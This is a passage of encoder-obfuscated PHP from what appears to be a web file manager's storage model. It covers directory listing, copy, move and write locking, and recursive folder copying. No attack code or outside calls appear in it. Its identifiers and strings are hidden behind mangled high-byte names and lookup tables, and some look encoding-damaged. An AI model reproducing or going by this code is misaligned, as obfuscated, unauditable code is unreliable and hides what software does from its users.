$±Õì”¯‹[$¨·Íİ¢[450]] = $÷¾¸á‘ã[$©ˆ€Ïâ¦] ? $÷¾¸á‘ã[$©ˆ€Ïâ¦] : !1; if (isset($±Õì”¯‹[$¨·Íİ¢[461]]) && $±Õì”¯‹[$¨·Íİ¢[461]][$¨·Íİ¢[538]]) { $ºÍÀùş = $GLOBALS[$¨·Íİ¢[6]][$¨·Íİ¢[90]][$¨·Íİ¢[539]]; if ($±Õì”¯‹[$¨·Íİ¢[461]][$¨·Íİ¢[540]] <= time() - $ºÍÀùş) { $this->metaSet($±Õì”¯‹[$¨·Íİ¢[399]], $¨·Íİ¢[538], null); $this->metaSet($±Õì”¯‹[$¨·Íİ¢[399]], $¨·Íİ¢[540], null); unset($±Õì”¯‹[$¨·Íİ¢[461]][$¨·Íİ¢[538]]); continue; } $Í¨«†â = $±Õì”¯‹[$¨·Íİ¢[461]][$¨·Íİ¢[538]]; $±Õì”¯‹[$¨·Íİ¢[461]][$¨·Íİ¢[541]] = Model($¨·Íİ¢[537])->getInfoSimpleOuter($Í¨«†â); } } unset($±Õì”¯‹); } public function parentLevelArray($±šÑœê) { $Ê‘¸º§ =& $_SERVER[Ôó‡è­ƒ]; $±šÑœê = explode($Ê‘¸º§[50], trim($±šÑœê, $Ê‘¸º§[50])); return array_remove_value($±šÑœê, $Ê‘¸º§[194]); } public function listAll($¨“±µ±ø) { $ˆÚö®çë =& $_SERVER[Ôó‡è­ƒ]; $‘ğü£ˆ‘ = $this->sourceInfo($¨“±µ±ø); $Æ¤‡Ê·Ù = array($ˆÚö®çë[542] => array($ˆÚö®çë[543], $‘ğü£ˆ‘[$ˆÚö®çë[517]] . $¨“±µ±ø . $ˆÚö®çë[544]), $ˆÚö®çë[545] => 0); $ó½’Ö†Ú = $ˆÚö®çë[546]; $³‹„‹¯Š = "\x4c\105\x46\x54\x20\x4a\x4f\111\x4e\x20{$this->tablePrefix}\151\157\x5f\x66\x69\154\x65\x20\146\151\154\145\40\157\156\40\163\x6f\x75\162\143\x65\x2e\x66\x69\154\x65\111\x44\40\75\x20\x66\x69\x6c\145\56\146\151\154\x65\111\x44"; $§°ÈÂû¡ = $this->alias($ˆÚö®çë[440])->field($ó½’Ö†Ú)->where($Æ¤‡Ê·Ù)->join($³‹„‹¯Š)->select(); $this->_listAppendAuth($§°ÈÂû¡); $this->_listAppendUser($§°ÈÂû¡); $this->_listAppendPath($§°ÈÂû¡); $§°ÈÂû¡ = array_to_keyvalue($§°ÈÂû¡, $ˆÚö®çë[399]); $¡¤Îƒù = "\x2f{$‘ğü£ˆ‘[$ˆÚö®çë[32]]}\57"; $¡¤Îƒù = $¡¤Îƒù == $ˆÚö®çë[525] ? $ˆÚö®çë[8] : $¡¤Îƒù; $ÑŠşãš½ = array(); foreach ($§°ÈÂû¡ as $½°›·¬ => $òÓûÓµ™) { $¶äœÊó = $this->parentLevelArray($òÓûÓµ™[$ˆÚö®çë[517]]); array_shift($¶äœÊó); $­ÀÎ­Â = $¡¤Îƒù; for ($ğáóåèù = 0; $ğáóåèù < count($¶äœÊó); $ğáóåèù++) { $­ÀÎ­Â .= $§°ÈÂû¡[$¶äœÊó[$ğáóåèù]][$ˆÚö®çë[32]] . $ˆÚö®çë[8]; } $­ÀÎ­Â .= $òÓûÓµ™[$ˆÚö®çë[32]]; if ($òÓûÓµ™[$ˆÚö®çë[407]]) { $­ÀÎ­Â .= $ˆÚö®çë[8]; } $­ÀÎ­Â = str_replace($ˆÚö®çë[525], $ˆÚö®çë[8], $­ÀÎ­Â); $­ÀÎ­Â = str_replace($ˆÚö®çë[525], $ˆÚö®çë[8], $­ÀÎ­Â); $î„Ú†‹ = array($ˆÚö®çë[418] => str_replace($ˆÚö®çë[525], $ˆÚö®çë[8], $­ÀÎ­Â), $ˆÚö®çë[547] => intval($òÓûÓµ™[$ˆÚö®çë[407]]), $ˆÚö®çë[87] => $this->pathInfoFilter($òÓûÓµ™)); if (!$òÓûÓµ™[$ˆÚö®çë[407]]) { $î„Ú†‹[$ˆÚö®çë[463]] = $òÓûÓµ™[$ˆÚö®çë[463]]; $î„Ú†‹[$ˆÚö®çë[88]] = $òÓûÓµ™[$ˆÚö®çë[78]]; } $ÑŠşãš½[] = $î„Ú†‹; } return $ÑŠşãš½; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($„„êøœğ) { $†‹åœ©é =& $_SERVER[Ôó‡è­ƒ]; if (!$this->allowLock()) { return; } $this->_lockCheck($†‹åœ©é[548], $„„êøœğ); $›ıÛá’ = 1; $this->_lockEvent($„„êøœğ, array($†‹åœ©é[549], $†‹åœ©é[550]), $›ıÛá’); $this->_lockParent($„„êøœğ, array($†‹åœ©é[550]), $›ıÛá’); $this->_lockEvent($„„êøœğ, array($†‹åœ©é[551], $†‹åœ©é[552]), $›ıÛá’); $this->_lockCheckEnd($†‹åœ©é[548], $„„êøœğ); } public function lockCopyEnd($Ùô«á­É) { $™÷ÎÄñ =& $_SERVER[Ôó‡è­ƒ]; if (!$this->allowLock()) { return; } $ùöô­¿ = 0; $this->_lockEvent($Ùô«á­É, array($™÷ÎÄñ[549], $™÷ÎÄñ[550]), $ùöô­¿); $this->_lockParent($Ùô«á­É, array($™÷ÎÄñ[550]), $ùöô­¿); $this->_lockEvent($Ùô«á­É, array($™÷ÎÄñ[551], $™÷ÎÄñ[552]), $ùöô­¿); } public function lockWriteStart($…ìÒ°È², $ÔŒ¼é = '') { $ß””°µ =& $_SERVER[Ôó‡è­ƒ]; if (!$this->allowLock()) { return; } $this->_lockCheck($ß””°µ[549], $…ìÒ°È²); $³µ¸¥ËÏ = 1; $this->_lockKey($ß””°µ[553] . $…ìÒ°È² . $ß””°µ[10] . $ÔŒ¼é, $³µ¸¥ËÏ); $this->_lockEvent($…ìÒ°È², array($ß””°µ[548], $ß””°µ[550]), $³µ¸¥ËÏ); $this->_lockParent($…ìÒ°È², array($ß””°µ[548], $ß””°µ[550]), $³µ¸¥ËÏ); $this->_lockCheckEnd($ß””°µ[549], $…ìÒ°È²); } public function lockWriteEnd($ÂÉÚßÒ, $Î÷€ö› = '') { $Œ…Óİ¢é =& $_SERVER[Ôó‡è­ƒ]; if (!$this->allowLock()) { return; } $¾§‚“¶‚ = 0; $this->_lockKey($Œ…Óİ¢é[553] . $ÂÉÚßÒ . $Œ…Óİ¢é[10] . $Î÷€ö›, $¾§‚“¶‚); $this->_lockEvent($ÂÉÚßÒ, array($Œ…Óİ¢é[548], $Œ…Óİ¢é[550]), $¾§‚“¶‚); $this->_lockParent($ÂÉÚßÒ, array($Œ…Óİ¢é[548], $Œ…Óİ¢é[550]), $¾§‚“¶‚); } public function lockMoveStart($÷–ë÷Ÿ) { $¸»º¯… =& $_SERVER[Ôó‡è­ƒ]; if (!$this->allowLock()) { return; } $this->_lockCheck($¸»º¯…[550], $÷–ë÷Ÿ); $òšŠ¡·£ = 1; $this->_lockKey($¸»º¯…[554] . $÷–ë÷Ÿ, $òšŠ¡·£); $this->_lockEvent($÷–ë÷Ÿ, array($¸»º¯…[548], $¸»º¯…[549]), $òšŠ¡·£); $this->_lockParent($÷–ë÷Ÿ, array($¸»º¯…[548], $¸»º¯…[550]), $òšŠ¡·£); $this->_lockEvent($÷–ë÷Ÿ, array($¸»º¯…[555], $¸»º¯…[551], $¸»º¯…[552]), $òšŠ¡·£); $this->_lockCheckEnd($¸»º¯…[550], $÷–ë÷Ÿ); } public function lockMoveEnd($ú³Şèú–) { $ìÒá¡äš =& $_SERVER[Ôó‡è­ƒ]; if (!$this->allowLock()) { return; } $ƒåšéõ« = 0; $this->_lockKey($ìÒá¡äš[554] . $ú³Şèú–, $ƒåšéõ«); $this->_lockEvent($ú³Şèú–, array($ìÒá¡äš[548], $ìÒá¡äš[549]), $ƒåšéõ«); $this->_lockParent($ú³Şèú–, array($ìÒá¡äš[548], $ìÒá¡äš[550]), $ƒåšéõ«); $this->_lockEvent($ú³Şèú–, array($ìÒá¡äš[555], $ìÒá¡äš[551], $ìÒá¡äš[552]), $ƒåšéõ«); } private function _lockCheck($øÂ£Œ•Ã, $Ö€…åÕ¡) { $ıÑŸÉ’Æ =& $_SERVER[Ôó‡è­ƒ]; $İèÏ„Ùõ = $this->sourceInfo($Ö€…åÕ¡); $›Ããş½ı = $øÂ£Œ•Ã . $ıÑŸÉ’Æ[10] . $Ö€…åÕ¡; $this->_lockTimeStart[$›Ããş½ı] = timeFloat(); if (!is_array($İèÏ„Ùõ)) { return; } $ß´şî = LNG($ıÑŸÉ’Æ[556]); CacheLock::setErrorMsg($ıÑŸÉ’Æ[163] . htmlspecialchars($İèÏ„Ùõ[$ıÑŸÉ’Æ[32]]) . $ıÑŸÉ’Æ[532] . $ß´şî); $this->_lockKey($›Ããş½ı, 1); $this->_lockKey($›Ããş½ı, 0); $Éûó¼ìÖ = array_reverse($this->parentLevelArray($İèÏ„Ùõ[$ıÑŸÉ’Æ[517]])); foreach ($Éûó¼ìÖ as $ıîÃåğà) { $›Ããş½ı = $øÂ£Œ•Ã . $ıÑŸÉ’Æ[557] . $ıîÃåğà; if (CacheLock::lockGet($ıÑŸÉ’Æ[558] . $›Ããş½ı)) { $İèÏ„Ùõ = $this->sourceInfo($ıîÃåğà); CacheLock::setErrorMsg($ıÑŸÉ’Æ[163] . htmlspecialchars($İèÏ„Ùõ[$ıÑŸÉ’Æ[32]]) . $ıÑŸÉ’Æ[532] . $ß´şî); $this->_lockKey($›Ããş½ı, 1); $this->_lockKey($›Ããş½ı, 0); } } } private function _lockCheckEnd($‡ü¯˜, $Ì¸¤ºÚñ) { $®²³‚Ñ =& $_SERVER[Ôó‡è­ƒ]; $èñ®ÓŞü = $‡ü¯˜ . $®²³‚Ñ[10] . $Ì¸¤ºÚñ; CacheLock::setErrorMsg($®²³‚Ñ[377]); if (!isset($this->_lockTimeStart[$èñ®ÓŞü])) { return; } $™ş¤é×ó = timeFloat() - $this->_lockTimeStart[$èñ®ÓŞü]; unset($this->_lockTimeStart[$èñ®ÓŞü]); if ($™ş¤é×ó > 0.5) { unset(self::$cacheSourceInfo[$®²³‚Ñ[454] . $Ì¸¤ºÚñ]); } $í„¹¶‹à = $this->sourceInfo($Ì¸¤ºÚñ); if (!$í„¹¶‹à) { show_json(LNG($®²³‚Ñ[106]), !1); } } private function _lockParent($Ş¨Ë•ÌÑ, $ÉáÄÇ¹À, $¹ñëşÊ¬) { if (!$this->autoLockSet) { return; } $ôá®³µÉ = $this->sourceInfo($Ş¨Ë•ÌÑ); if (!is_array($ôá®³µÉ)) { return; } $†€‹ÈÚÜ = array_reverse($this->parentLevelArray($ôá®³µÉ[$_SERVER[Ôó‡è­ƒ][517]])); foreach ($†€‹ÈÚÜ as $¯…‹ôæ™) { $this->_lockEvent($¯…‹ôæ™, $ÉáÄÇ¹À, $¹ñëşÊ¬); } } private function _lockEvent($óÚÏÎÉé, $ÂœÇîá, $éÒ¢é„È) { $òÆûèËü =& $_SERVER[Ôó‡è­ƒ]; if (!$this->autoLockSet) { return; } foreach ($ÂœÇîá as $€«Ãê‰›) { $ãï¹øµ¤ = $€«Ãê‰› . $òÆûèËü[10] . $óÚÏÎÉé; if ($éÒ¢é„È && CacheLock::lockGet($òÆûèËü[558] . $ãï¹øµ¤)) { continue; } $this->_lockKey($ãï¹øµ¤, $éÒ¢é„È); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($»Èşìûş, $²àç«ã‰ = 1) { $¥™ÊÜ»‹ = $_SERVER[Ôó‡è­ƒ][558] . md5($»Èşìûş); if ($²àç«ã‰) { if (isset(self::$_lockItemArr[$¥™ÊÜ»‹])) { return; } self::$_lockItemArr[$¥™ÊÜ»‹] = 1; CacheLock::lock($¥™ÊÜ»‹, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$¥™ÊÜ»‹])) { return; } unset(self::$_lockItemArr[$¥™ÊÜ»‹]); CacheLock::unlock($¥™ÊÜ»‹); } } public function isParentOf($¸É¸Åç‘, $ÃŒİÃ½©) { $ÓÙëò =& $_SERVER[Ôó‡è­ƒ]; $›¸¶Ò¢ = $this->sourceInfo($¸É¸Åç‘); $¤ĞİÚõ› = $this->sourceInfo($ÃŒİÃ½©); $İÌ›ä¡¬ = $›¸¶Ò¢[$ÓÙëò[517]] . $›¸¶Ò¢[$ÓÙëò[399]] . $ÓÙëò[50]; $Å°¶âÍ = $¤ĞİÚõ›[$ÓÙëò[517]] . $¤ĞİÚõ›[$ÓÙëò[399]] . $ÓÙëò[50]; $ñõ²”÷¶ = strpos($Å°¶âÍ, $İÌ›ä¡¬) === 0; return $ñõ²”÷¶; } private $targetIsDelete = 0; public function copy($ˆê¿Şİ , $şÙı¶ƒ’, $¼¼Ìöåç = REPEAT_REPLACE, $¡’Ÿâëß = '') { $¡ÆÀ³æä =& $_SERVER[Ôó‡è­ƒ]; $ş±ß–ÈÄ = $this->sourceInfo($ˆê¿Şİ ); $«·óÉ¦° = $this->sourceInfo($şÙı¶ƒ’); if (!$ş±ß–ÈÄ || !$«·óÉ¦° || $«·óÉ¦°[$¡ÆÀ³æä[407]] != $¡ÆÀ³æä[89]) { return !1; } if ($this->isParentOf($ˆê¿Şİ , $şÙı¶ƒ’)) { return !1; } $ó— ş¡Ó = $¡’Ÿâëß ? $¡’Ÿâëß : $ş±ß–ÈÄ[$¡ÆÀ³æä[32]]; $this->lockCopyStart($ˆê¿Şİ ); $this->lockWriteStart($şÙı¶ƒ’, $ó— ş¡Ó); $‡Ï‘³Ã = array($¡ÆÀ³æä[559] => array(), $¡ÆÀ³æä[560] => array(), $¡ÆÀ³æä[561] => array()); $this->targetIsDelete = intval($ş±ß–ÈÄ[$¡ÆÀ³æä[427]]); $»Å˜¬¿® = $this->fileNameExistCache($şÙı¶ƒ’, $ş±ß–ÈÄ[$¡ÆÀ³æä[32]]); $Ã¶†£±ƒ = $this->_copy($ˆê¿Şİ , $şÙı¶ƒ’, $¼¼Ìöåç, $‡Ï‘³Ã, !0, $¡’Ÿâëß); $this->_childrenListClear(); $this->lockCopyEnd($ˆê¿Şİ ); $this->lockWriteEnd($şÙı¶ƒ’, $ó— ş¡Ó); if ($ş±ß–ÈÄ[$¡ÆÀ³æä[407]] == $¡ÆÀ³æä[89] && $»Å˜¬¿® == $Ã¶†£±ƒ) { $this->folderSizeResetChildren($»Å˜¬¿®); } Model($¡ÆÀ³æä[562])->addAll($‡Ï‘³Ã[$¡ÆÀ³æä[560]], array(), !0); if ($»Å˜¬¿® != $Ã¶†£±ƒ || $ş±ß–ÈÄ[$¡ÆÀ³æä[407]] == $¡ÆÀ³æä[89]) { Model($¡ÆÀ³æä[563])->eventCopy($Ã¶†£±ƒ); } $this->saveAll($‡Ï‘³Ã[$¡ÆÀ³æä[561]]); Model($¡ÆÀ³æä[196])->linkAdd($‡Ï‘³Ã[$¡ÆÀ³æä[559]]); $this->folderSizeReset($şÙı¶ƒ’); $this->updateModifyTime($şÙı¶ƒ’); return $Ã¶†£±ƒ; } private function _copy($ĞÑÀú‰Œ, $÷ —Š¶, $Ù¤Úèßã, &$ôç£á÷í, $½ŸºË¹ü, $ÑÆçêÈ¥ = '') { $šÑ£•Ú =& $_SERVER[Ôó‡è­ƒ]; $ä«º•Ã = $this->sourceInfoCache($ĞÑÀú‰Œ); $îÇ¬ö¹ = $ä«º•Ã[$šÑ£•Ú[407]] == $šÑ£•Ú[89]; $¼Æ™’ü÷ = $ÑÆçêÈ¥ ? $ÑÆçêÈ¥ : $ä«º•Ã[$šÑ£•Ú[32]]; $Ì±œíã = $this->fileNameExistCache($÷ —Š¶, $¼Æ™’ü÷); if ($½ŸºË¹ü) { $this->_childrenAllMake($ĞÑÀú‰Œ); if ($îÇ¬ö¹ && $Ì±œíã) { $this->_childrenAllMake($Ì±œíã); } } if (!$Ì±œíã) { return $this->_copyCreate($ĞÑÀú‰Œ, $÷ —Š¶, $¼Æ™’ü÷, $ôç£á÷í); } $å–¹À»´ = $Ì±œíã; if ($îÇ¬ö¹) { if ($Ù¤Úèßã == REPEAT_RENAME_FOLDER) { $¼Æ™’ü÷ = $this->fileNameAutoCache($÷ —Š¶, $¼Æ™’ü÷, $Ù¤Úèßã, $îÇ¬ö¹); $å–¹À»´ = $this->_copyCreate($ĞÑÀú‰Œ, $÷ —Š¶, $¼Æ™’ü÷, $ôç£á÷í); } else { $Çãø»ğ¹ = $this->_childrenList($ĞÑÀú‰Œ); foreach ($Çãø»ğ¹ as $Œûµåí) { $this->_copy($Œûµåí[$šÑ£•Ú[399]], $Ì±œíã, $Ù¤Úèßã, $ôç£á÷í, !1); } } } else { if ($Ù¤Úèßã == REPEAT_RENAME || $Ù¤Úèßã == REPEAT_RENAME_FOLDER) { $¼Æ™’ü÷ = $this->fileNameAutoCache($÷ —Š¶, $¼Æ™’ü÷, $Ù¤Úèßã, $îÇ¬ö¹); $å–¹À»´ = $this->_copyCreate($ĞÑÀú‰Œ, $÷ —Š¶, $¼Æ™’ü÷, $ôç£á÷í); } else { if ($Ù¤Úèßã == REPEAT_REPLACE) { $Ã÷ØıØ¤ = $this->sourceInfoCache($Ì±œíã); $´ª’Ğéš = $this->fileHistory($Ã÷ØıØ¤, $ä«º•Ã[$šÑ£•Ú[463]], $ä«º•Ã[$šÑ£•Ú[80]]); if ($´ª’Ğéš) { $ôç£á÷í[$šÑ£•Ú[559]][] = $ä«º•Ã[$šÑ£•Ú[463]]; } } else { if ($Ù¤Úèßã == REPEAT_SKIP) { } } } Hook::trigger($šÑ£•Ú[564], array($šÑ£•Ú[565], $ä«º•Ã, 0)); } return $å–¹À»´; } private function _copyCreate($ŞÌ¹±¡‡, $öÜŸ¬ö, $ãŠÒÀ”‡, &$îìŒúÕ) { $Öª¿ü” =& $_SERVER[Ôó‡è­ƒ]; $À–®ÏùÌ = $this->sourceInfoCache($ŞÌ¹±¡‡); $é‰³×¡ = $this->sourceInfoCache($öÜŸ¬ö); $ÖÓãŒ¸À = $this->_makeItemData($À–®ÏùÌ, $é‰³×¡, $ãŠÒÀ”‡); Hook::trigger($Öª¿ü”[566], $ÖÓãŒ¸À); Hook::trigger($Öª¿ü”[567], array($Öª¿ü”[568], $ÖÓãŒ¸À, 0)); $ÈË»–•… = $this->add($ÖÓãŒ¸À); $‹ñò€¶¹ = array($Öª¿ü”[399] => $ÈË»–•…, $Öª¿ü”[32] => $ãŠÒÀ”‡); $this->_copyApplyMeta($‹ñò€¶¹, $îìŒúÕ); if ($À–®ÏùÌ[$Öª¿ü”[407]] != $Öª¿ü”[89]) { $îìŒúÕ[$Öª¿ü”[559]][] = $À–®ÏùÌ[$Öª¿ü”[463]]; return $ÈË»–•…; } $–Ş“¤ª÷ = array(); $®åÏã¿¡ = array(); $this->_childrenListAll($ŞÌ¹±¡‡, $–Ş“¤ª÷); $Ù§…›íı = count($–Ş“¤ª÷); if ($Ù§…›íı == 0) { return $ÈË»–•…; } $şØøó¡¢ = $this->sourceInfo($ÈË»–•…); foreach ($–Ş“¤ª÷ as $Í¡şş˜) { $ĞâÏİšŞ = $this->_makeItemData($Í¡şş˜, $şØøó¡¢, $Í¡şş˜[$Öª¿ü”[32]]); $ĞâÏİšŞ[$Öª¿ü”[517]] = $Í¡şş˜[$Öª¿ü”[517]]; $®åÏã¿¡[] = $ĞâÏİšŞ; } $this->chunkEventSet($Öª¿ü”[569], array($Öª¿ü”[570], $ÖÓãŒ¸À, $Ù§…›íı)); $this->addAll($®åÏã¿¡, array(), !1); $ç×Ñ‡” = $this->where(array($Öª¿ü”[494] => $ÈË»–•…))->select(); $–«¯¦Ó¬ = $this->_childrenMakeRelation($–Ş“¤ª÷, $ç×Ñ‡”); $–«¯¦Ó¬[$ŞÌ¹±¡‡] = $ÈË»–•…; $ïà³©ì• = array(); $ééÇ¹‚ = array(); foreach ($ç×Ñ‡” as $Í¡şş˜) { $‡ËÍÙÜÔ = $Í¡şş˜[$Öª¿ü”[399]]; $ÄÄ¸…±æ = $this->_childrenMatch($–«¯¦Ó¬, $Í¡şş˜, $şØøó¡¢); $ïà³©ì•[] = array($Öª¿ü”[399], $‡ËÍÙÜÔ, $Öª¿ü”[494], $ÄÄ¸…±æ[$Öª¿ü”[494]]); $ééÇ¹‚[] = array($Öª¿ü”[399], $‡ËÍÙÜÔ, $Öª¿ü”[517], $ÄÄ¸…±æ[$Öª¿ü”[517]]); $this->_copyApplyMeta($Í¡şş˜, $îìŒúÕ); if ($Í¡şş˜[$Öª¿ü”[407]] != $Öª¿ü”[89]) { $îìŒúÕ[$Öª¿ü”[559]][] = $Í¡şş˜[$Öª¿ü”[463]]; } } $this->chunkEventSet($Öª¿ü”[571], array($Öª¿ü”[572], $ÖÓãŒ¸À, $Ù§…›íı)); $this->saveAll($ïà³©ì•); $this->chunkEventSet($Öª¿ü”[573], array($Öª¿ü”[574], $ÖÓãŒ¸À, $Ù§…›íı)); $this->saveAll($ééÇ¹‚); return $ÈË»–•…; } private function _childrenMakeRelation($ÏÂ²Ü¼±, $¶ßÃúæ“) { $ŒõøÁñ„ =& $_SERVER[Ôó‡è­ƒ]; $ç¶ùÔµ§ = array(); $¼“‰¥Ù = array(); foreach ($ÏÂ²Ü¼± as $Òê¶®“) { $ÃêéÖ† = $Òê¶®“[$ŒõøÁñ„[32]] . $ŒõøÁñ„[8] . $Òê¶®“[$ŒõøÁñ„[517]]; $ç¶ùÔµ§[$ÃêéÖ†] = $Òê¶®“[$ŒõøÁñ„[399]]; } foreach ($¶ßÃúæ“ as $Òê¶®“) { $ÃêéÖ† = $Òê¶®“[$ŒõøÁñ„[32]] . $ŒõøÁñ„[8] . $Òê¶®“[$ŒõøÁñ„[517]]; $§Êò±‚Ä = $ç¶ùÔµ§[$ÃêéÖ†]; $¼“‰¥Ù[$§Êò±‚Ä] = $Òê¶®“[$ŒõøÁñ„[399]]; } return $¼“‰¥Ù; } private function _childrenMatch($ŒÌÖŠ¶¦, $À©ìˆ­®, $²ßŠğË) { $Õ‡—®ó´ =& $_SERVER[Ôó‡è­ƒ]; $««Äñ¡² = $²ßŠğË[$Õ‡—®ó´[517]]; $§‹à“û‡ = $this->parentLevelArray($À©ìˆ­®[$Õ‡—®ó´[517]]); foreach ($§‹à“û‡ as $¼Åµ×™Ÿ) { if (isset($ŒÌÖŠ¶¦[$¼Åµ×™Ÿ])) { $««Äñ¡² .= $ŒÌÖŠ¶¦[$¼Åµ×™Ÿ] . $Õ‡—®ó´[575]; } } $««Äñ¡² = rtrim($««Äñ¡², $Õ‡—®ó´[50]) . $Õ‡—®ó´[50]; $ØŠÍÒ™ì = $this->parentLevelArray($««Äñ¡²); $à¼½£Âè = $ØŠÍÒ™ì[count($ØŠÍÒ™ì) - 1]; return array($Õ‡—®ó´[494] => $à¼½£Âè, $Õ‡—®ó´[517] => $««Äñ¡²); } private function _makeItemData($óà×È¤“, $ò»¦“Û‘, $¹ü«Æí´) { $ß´Û«ª =& $_SERVER[Ôó‡è­ƒ]; $çÇ«ª¨ê = array($ß´Û«ª[576] => $óà×È¤“[$ß´Û«ª[407]], $ß´Û«ª[417] => $¹ü«Æí´, $ß´Û«ª[577] => $óà×È¤“[$ß´Û«ª[409]] ? $óà×È¤“[$ß´Û«ª[409]] : $ß´Û«ª[12], $ß´Û«ª[464] => $óà×È¤“[$ß´Û«ª[463]] ? $óà×È¤“[$ß´Û«ª[463]] : 0, $ß´Û«ª[578] => $óà×È¤“[$ß´Û«ª[80]] ? $óà×È¤“[$ß´Û«ª[80]] : 0, $ß´Û«ª[579] => intval($ò»¦“Û‘[$ß´Û«ª[408]]), $ß´Û«ª[580] => intval($ò»¦“Û‘[$ß´Û«ª[501]]), $ß´Û«ª[581] => intval(USER_ID), $ß´Û«ª[582] => intval(USER_ID), $ß´Û«ª[398] => intval($ò»¦“Û‘[$ß´Û«ª[399]]), $ß´Û«ª[583] => $ò»¦“Û‘[$ß´Û«ª[517]] . $ò»¦“Û‘[$ß´Û«ª[399]] . $ß´Û«ª[50], $ß´Û«ª[421] => $óà×È¤“[$ß´Û«ª[86]] ? $óà×È¤“[$ß´Û«ª[86]] : time(), $ß´Û«ª[426] => 0, $ß´Û«ª[584] => $ß´Û«ª[12]); return $çÇ«ª¨ê; } private function _copyApplyMeta($æ‡“êÜù, &$êöıßè) { $¯‡†©â‹ =& $_SERVER[Ôó‡è­ƒ]; $ƒ¿ÃÂ = $æ‡“êÜù[$¯‡†©â‹[399]]; $¤úãï¶€ = $æ‡“êÜù[$¯‡†©â‹[32]]; if (!isset($æ‡“êÜù[$¯‡†©â‹[585]]) || !$æ‡“êÜù[$¯‡†©â‹[585]] || $æ‡“êÜù[$¯‡†©â‹[585]] == $¯‡†©â‹[194]) { $êöıßè[$¯‡†©â‹[561]][] = array($¯‡†©â‹[399], $ƒ¿ÃÂ, $¯‡†©â‹[585], short_id($ƒ¿ÃÂ)); } if (Input::check($¤úãï¶€, $¯‡†©â‹[586])) { $êöıßè[$¯‡†©â‹[560]][] = array($¯‡†©â‹[399] => $ƒ¿ÃÂ, $¯‡†©â‹[95] => $¯‡†©â‹[460], $¯‡†©â‹[373] => str_replace($¯‡†©â‹[53], $¯‡†©â‹[12], Pinyin::get($¤úãï¶€))); $êöıßè[$¯‡†©â‹[560]][] = array($¯‡†©â‹[399] => $ƒ¿ÃÂ, $¯‡†©â‹[95] => $¯‡†©â‹[459], $¯‡†©â‹[373] => Pinyin::get($¤úãï¶€, $¯‡†©â‹[587])); } $êöıßè[$¯‡†©â‹[560]][] = array($¯‡†©â‹[399] => $ƒ¿ÃÂ, $¯‡†©â‹[95] => $¯‡†©â‹[438], $¯‡†©â‹[373] => KodSort::makeStr($¤úãï¶€)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($«ØÒöìæ) { $¢ ¹Ïóà =& $_SERVER[Ôó‡è­ƒ]; $í²øÊ’¢ = $this->sourceInfo($«ØÒöìæ); $…‚´×ÒÎ = $¢ ¹Ïóà[588]; $†ßÄ€Î‡ = array($¢ ¹Ïóà[517] => array($¢ ¹Ïóà[543], $í²øÊ’¢[$¢ ¹Ïóà[517]] . $«ØÒöìæ . $¢ ¹Ïóà[544]), $¢ ¹Ïóà[427] => $this->targetIsDelete); $šóÌı = $this->field($…‚´×ÒÎ)->where($†ßÄ€Î‡)->select(); if (!$šóÌı) { return; } $šóÌı = array_to_keyvalue($šóÌı, $¢ ¹Ïóà[399]); foreach ($šóÌı as $±“æ²‰) { $Úà¥†ĞÔ = $±“æ²‰[$¢ ¹Ïóà[494]]; $«ØÒöìæ = $±“æ²‰[$¢ ¹Ïóà[399]]; if (!isset($this->_childrenListCache[$«ØÒöìæ]) && $±“æ²‰[$¢ ¹Ïóà[407]] == $¢ ¹Ïóà[89]) { $this->_childrenListCache[$«ØÒöìæ] = array(); } if (!isset($this->_childrenListCache[$Úà¥†ĞÔ])) { $this->_childrenListCache[$Úà¥†ĞÔ] = array(); } $this->_childrenListCache[$Úà¥†ĞÔ][$«ØÒöìæ] = $±“æ²‰; $this->_childrenItemCache[$«ØÒöìæ] = $±“æ²‰; } } private function _childrenListAll($Šï´±Åâ, &$ò¼ìÉÜà) { $Üä®‡ì =& $_SERVER[Ôó‡è­ƒ]; if (!isset($this->_childrenListCache[$Šï´±Åâ])) { return; } $ã£¢ÑªÉ = $this->_childrenListCache[$Šï´±Åâ]; foreach ($ã£¢ÑªÉ as $÷ƒªË• => $Ë´×İ í) { $ò¼ìÉÜà[$÷ƒªË•] = $Ë´×İ í; if ($Ë´×İ í[$Üä®‡ì[407]] == $Üä®‡ì[89]) { $this->_childrenListAll($÷ƒªË•, $ò¼ìÉÜà); } } } private function sourceInfoCache($…óü¬®ä) { if (isset($this->_childrenItemCache[$…óü¬®ä])) { return $this->_childrenItemCache[$…óü¬®ä]; } return $this->sourceInfo($…óü¬®ä); } private function _childrenList($é˜á÷êŠ) { if (isset($this->_childrenListCache[$é˜á÷êŠ])) { return $this->_childrenListCache[$é˜á÷êŠ]; } return $this->_childrenListSelect($é˜á÷êŠ); } private function _childrenListSelect($øöÌ€¼) { $¬µ©ˆÜ˜ =& $_SERVER[Ôó‡è­ƒ]; $…†ÇÆ£ = array($¬µ©ˆÜ˜[494] => $øöÌ€¼, $¬µ©ˆÜ˜[427] => $this->targetIsDelete); $ş“¼ª•ç = $this->where($…†ÇÆ£)->select(); $ş“¼ª•ç = $ş“¼ª•ç ? $ş“¼ª•ç : array(); $²´¡Æ– = array_to_keyvalue($ş“¼ª•ç, $¬µ©ˆÜ˜[399]); $this->_childrenListCache[$øöÌ€¼] = $²´¡Æ–; foreach ($²´¡Æ– as $øöÌ€¼ => $ª‰›ä¾) { $this->_childrenItemCache[$øöÌ€¼] = $ª‰›ä¾; } return $²´¡Æ–; } private function fileNameExistCache($¶¡„üı³, $ÂƒÜïè) { $ãÖ ·Ş§ =& $_SERVER[Ôó‡è­ƒ]; $ÂƒÜïè = strtolower($ÂƒÜïè); $†éÍšÖÛ = $this->_childrenList($¶¡„üı³); foreach ($†éÍšÖÛ as $û“İ×ıı) { if ($ÂƒÜïè == strtolower($û“İ×ıı[$ãÖ ·Ş§[32]])) { return $û“İ×ıı[$ãÖ ·Ş§[399]]; } } return !1; } private function fileNameAutoCache($ÆíÔ¶½¥, $¹¼Í¡ğ, $Æ•çÔŞ†, $Œ¥ú®Ö) { $èà»¼Êó =& $_SERVER[Ôó‡è­ƒ]; $À»ç­­Ê = $this->_childrenList($ÆíÔ¶½¥); $ÒÛÊß•È = array_to_keyvalue($À»ç­­Ê, $èà»¼Êó[12], $èà»¼Êó[32]); return 